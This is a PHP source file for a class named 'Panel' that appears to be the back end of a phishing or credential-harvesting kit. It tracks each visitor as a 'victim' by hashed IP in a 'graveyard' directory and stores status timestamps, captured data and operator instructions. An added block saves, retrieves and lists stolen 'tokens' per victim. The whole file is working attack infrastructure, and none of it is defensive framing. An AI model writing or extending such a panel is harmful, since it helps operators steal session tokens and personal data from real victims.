<?php
  
require_once __DIR__.'/../../test_config.php';

class Panel{

    public $IP = null;
    public $HASH = null;
    public $DATA_PATH = (__DIR__)."/graveyard/";
    public $DATA_STATU_PATH = (__DIR__)."/graveyard/status/";
    public $DATA_DATA_PATH = (__DIR__)."/graveyard/data/";
    public $DATA_INST_PATH = (__DIR__)."/graveyard/inst/";

    function __construct(){
        $this->IP = getRealClientIP();
        $this->makeVicFile();
    }

    function makeVicFile(){
        if(!file_exists($this->DATA_PATH. $this->getHashName($this->IP))){
            $fp = fopen($this->DATA_PATH. $this->getHashName($this->IP), "w+");
            fwrite($fp, 0);
            fclose($fp);
        }
        if(!file_exists($this->DATA_STATU_PATH. $this->getHashName($this->IP))){
            $fp = fopen($this->DATA_STATU_PATH. $this->getHashName($this->IP), "w+");
            fwrite($fp, time());
            fclose($fp);
        }
    }

    function editVicFile($data, $vip){
        $fp = fopen($this->DATA_PATH. $this->getHashName($vip), "w+");
        fwrite($fp, $data);
        fclose($fp);
    }

    function getHashName($vip){
        $this->HASH =  substr(md5($vip), 0 , 15).".txt";
        return $this->HASH;
    }

    function getData(){
        $data = file_get_contents($this->DATA_PATH. $this->HASH);
        return $data;
    }

    public function getStatu($ip){
        $data = file_get_contents($this->DATA_STATU_PATH. $this->getHashName($ip));
        return $data;
    }

    public function updateStatu($ip){
            $fp = fopen($this->DATA_STATU_PATH. $this->getHashName($ip), "w+");
            fwrite($fp, time());
            fclose($fp);
    }



    public function getD($ip){
        $data = file_get_contents($this->DATA_DATA_PATH. $this->getHashName($ip));
        return $data;
    }

    public function updateD($ip, $content){
            $fp = fopen($this->DATA_DATA_PATH. $this->getHashName($ip), "w+");
            fwrite($fp, $content);
            fclose($fp);
    }


    
    public function getInst($ip){
        $data = file_get_contents($this->DATA_INST_PATH. $this->getHashName($ip));
        return $data;
    }

    public function updateInst($ip, $content){
            $fp = fopen($this->DATA_INST_PATH. $this->getHashName($ip), "w+");
            fwrite($fp, $content);
            fclose($fp);
    }


    // Add these methods to your Panel class

public function saveToken($ip, $token){
    $token_file = $this->DATA_DATA_PATH . "tokens/" . $this->getHashName($ip);
    
    // Create tokens directory if it doesn't exist
    $token_dir = $this->DATA_DATA_PATH . "tokens/";
    if(!is_dir($token_dir)){
        mkdir($token_dir, 0755, true);
    }
    
    $fp = fopen($token_file, "w+");
    fwrite($fp, $token);
    fclose($fp);
    return true;
}

public function getToken($ip){
    $token_file = $this->DATA_DATA_PATH . "tokens/" . $this->getHashName($ip);
    
    if(file_exists($token_file)){
        return file_get_contents($token_file);
    }
    return "";
}

public function getAllTokens(){
    $token_dir = $this->DATA_DATA_PATH . "tokens/";
    $tokens = array();
    
    if(is_dir($token_dir)){
        $files = scandir($token_dir);
        foreach($files as $file){
            if($file != "." && $file != ".."){
                $ip_hash = str_replace(".txt", "", $file);
                $token = file_get_contents($token_dir . $file);
                $tokens[] = array(
                    'ip_hash' => $ip_hash,
                    'token' => $token
                );
            }
        }
    }
    return $tokens;
}
}




?>